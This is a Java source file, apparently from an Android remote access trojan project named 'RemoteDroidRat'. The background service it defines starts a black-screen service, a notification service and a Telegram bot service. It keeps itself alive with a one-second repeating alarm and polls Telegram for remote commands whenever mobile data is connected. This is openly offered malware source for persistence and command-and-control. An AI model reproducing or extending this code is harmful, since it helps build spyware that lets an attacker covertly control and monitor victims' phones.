package com.KaranKumar.RemoteDroidRat.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.app.PendingIntent;
import android.app.AlarmManager;
import android.os.SystemClock;
import com.KaranKumar.RemoteDroidRat.broadcasts.alarmManager;
import android.widget.Toast;
import android.content.Context;
import com.KaranKumar.RemoteDroidRat.telegramBot.TelegramBotService;
import com.KaranKumar.RemoteDroidRat.telegramBot.telegramBotCmd.TelegramBotCmdApi;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

public class background extends Service {

    @Override
    public void onCreate() {
        super.onCreate();
		/*
		 // Start other services
		 startForegroundService(new Intent(this, SmartClickService.class));
		 startForegroundService(new Intent(this, myNotification.class));


		 */
      

		startService(new Intent(this, BlackScreen.class));
        startService(new Intent(this, myNotification.class));
		Intent serviceIntent = new Intent(this, TelegramBotService.class);
		this.startService(serviceIntent);

        // Set up the repeating alarm
        alarm();

		if (isNetworkConnected()) {

			TelegramBotCmdApi tCmd = new TelegramBotCmdApi(this);
			tCmd.startCheckingMessages();
		}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void alarm() {
        // Set up AlarmManager
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        Intent alarmIntent = new Intent(this, alarmManager.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, alarmIntent, 0);

        // Set the repeating alarm
        long intervalMillis = 1000; // Set your desired interval
        long triggerTimeMillis = SystemClock.elapsedRealtime() + intervalMillis;

        if (alarmManager != null) {
            alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
											 triggerTimeMillis, intervalMillis, pendingIntent);
        }

        Toast.makeText(getApplicationContext(), "Service is running", Toast.LENGTH_SHORT).show();
    }

	private boolean isNetworkConnected() {
        ConnectivityManager connectivityManager = (ConnectivityManager) this.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mobileNetworkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        return mobileNetworkInfo != null && mobileNetworkInfo.isConnected();
    }
}
